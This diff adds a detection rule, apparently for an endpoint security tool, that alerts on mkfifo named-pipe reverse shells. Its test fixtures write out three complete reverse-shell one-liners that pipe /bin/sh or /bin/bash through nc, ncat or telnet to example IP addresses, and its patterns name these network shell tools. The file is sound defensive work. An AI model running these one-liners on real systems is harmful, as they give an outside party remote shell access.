@@ -1,0 +1,39 @@
+name: rta_mkfifo_reverse_shell_chain
+mode: alert
+overlap_allowed_with: [sigma_mkfifo_named_pipe_creation, sigma_mkfifo_named_pipe_creation_susp_location, rta_background_shell, sigma_bash_interactive_shell]
+eval: |
+  (
+    (
+      e.process_name == "mkfifo" &&
+      re_match(e.process_args, "/tmp/[a-zA-Z0-9_-]+")
+    ) ||
+    (
+      (e.process_name == "sh" || e.process_name == "bash") &&
+      re_match(e.process_args, "mkfifo") &&
+      (
+        re_match(e.process_args, "\\|\\s*(nc|ncat|netcat|telnet)") ||
+        re_match(e.process_args, "\\|\\s*/bin/(sh|bash)")
+      )
+    )
+  )
+tests:
+  - cleartext: "mkfifo named pipe creation in /tmp"
+    process_name: mkfifo
+    process_args: "mkfifo /tmp/f"
+    should_match: true
+  - cleartext: "bash mkfifo reverse shell with nc"
+    process_name: bash
+    process_args: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f"
+    should_match: true
+  - cleartext: "sh mkfifo reverse shell with ncat"
+    process_name: sh
+    process_args: "mkfifo /tmp/pipe;cat /tmp/pipe|/bin/bash -i 2>&1|ncat 192.168.1.1 8080 >/tmp/pipe"
+    should_match: true
+  - cleartext: "mkfifo with telnet"
+    process_name: bash
+    process_args: "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | telnet 10.10.10.10 4444 > /tmp/s"
+    should_match: true
+  - cleartext: "normal mkfifo for IPC"
+    process_name: mkfifo
+    process_args: "mkfifo /var/run/myapp.pipe"
+    should_match: false
